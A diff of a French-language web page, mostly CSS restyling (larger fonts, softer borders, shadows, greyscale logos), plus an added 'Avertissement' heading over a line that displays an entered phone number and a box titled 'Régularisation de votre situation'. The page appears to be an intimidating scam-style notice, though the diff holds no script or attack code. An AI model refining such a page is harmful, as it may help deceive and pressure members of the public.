@@ -11,6 +11,7 @@
       margin: 0;
       background-color: #ffffff; /* Fond blanc */
       color: #000000; /* Texte noir */
+      line-height: 1.6;
     }
 
     /* Header Styles */
@@ -20,24 +21,25 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
-      border-bottom: 1px solid #3a3a3c;
+      border-bottom: 1px solid #e0e0e0; /* Bordure plus douce */
       position: sticky;
       top: 0;
       z-index: 1000;
-      height: 48px;
+      height: 60px; /* Un peu plus grand */
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Ombre légère */
     }
     header img {
-      height: 20px;
+      height: 24px; /* Un peu plus grand */
     }
     nav {
       display: flex;
-      gap: 15px;
+      gap: 20px; /* Plus d'espace entre les liens */
     }
     nav a {
       color: #000000; /* Texte noir */
       text-decoration: none;
-      font-size: 14px;
-      font-weight: 400;
+      font-size: 16px; /* Texte plus grand */
+      font-weight: 500; /* Un peu plus gras */
       transition: color 0.3s ease;
     }
     nav a:hover {
@@ -50,82 +52,91 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 25px;
+      padding: 40px; /* Plus d'espace */
       min-height: 90vh;
     }
     h1 {
-      font-size: 24px;
-      margin-bottom: 20px;
+      font-size: 28px; /* Plus grand */
+      margin-bottom: 30px; /* Plus d'espace */
+      font-weight: 600; /* Plus gras */
+      color: #000000; /* Texte noir */
     }
     .warning {
-      font-size: 18px;
+      font-size: 20px; /* Plus grand */
       color: #ffcc00;
-      margin-bottom: 20px;
+      margin-bottom: 30px; /* Plus d'espace */
       text-align: center;
     }
     .error-message {
       background-color: #ffffff; /* Fond blanc */
-      border: 1px solid #ff3b30;
-      border-radius: 5px;
-      padding: 20px;
+      border: 1px solid #e0e0e0; /* Bordure plus douce */
+      border-radius: 10px; /* Coins plus arrondis */
+      padding: 30px; /* Plus d'espace */
       color: #000000; /* Texte noir */
-      max-width: 600px;
+      max-width: 700px; /* Un peu plus large */
       text-align: center;
-      font-size: 18px;
+      font-size: 18px; /* Texte plus grand */
       line-height: 1.8;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Ombre légère */
     }
 
     /* Images Section */
     .image-container {
       display: flex;
       justify-content: center;
-      gap: 15px;
-      margin-top: 30px;
+      gap: 20px; /* Plus d'espace */
+      margin-top: 40px; /* Plus d'espace */
     }
     .image-container img {
-      height: 60px;
+      height: 70px; /* Un peu plus grand */
       object-fit: contain;
+      filter: grayscale(100%); /* Logos en noir et blanc */
+      opacity: 0.8; /* Un peu plus transparent */
+      transition: opacity 0.3s ease;
+    }
+    .image-container img:hover {
+      opacity: 1; /* Moins transparent au survol */
     }
 
     /* Responsive Styles */
     @media (max-width: 768px) {
       nav a {
-        font-size: 12px;
-        gap: 10px;
+        font-size: 14px;
+        gap: 15px;
       }
       header img {
-        height: 18px;
+        height: 22px;
       }
       .warning {
-        font-size: 16px;
+        font-size: 18px;
       }
       .error-message {
         font-size: 16px;
       }
       .image-container img {
-        height: 50px;
+        height: 60px;
       }
     }
 
     @media (max-width: 480px) {
       nav a {
-        font-size: 11px;
+        font-size: 13px;
       }
       header img {
-        height: 16px;
+        height: 20px;
       }
       h1 {
-        font-size: 20px;
+        font-size: 24px;
       }
       .warning {
-        font-size: 14px;
+        font-size: 16px;
       }
       .error-message {
         font-size: 14px;
-        padding: 15px;
+        padding: 20px;
       }
       .image-container img {
-        height: 40px;
+        height: 50px;
       }
     }
   </style>
@@ -149,6 +160,7 @@
 
   <!-- Main Content -->
   <main>
+    <h1>⚠️ Avertissement ⚠️</h1>
     <p class="warning">Numéro saisi : <span id="phone"></span></p>
     <div class="error-message">
       <p>Régularisation de votre situation :</p>
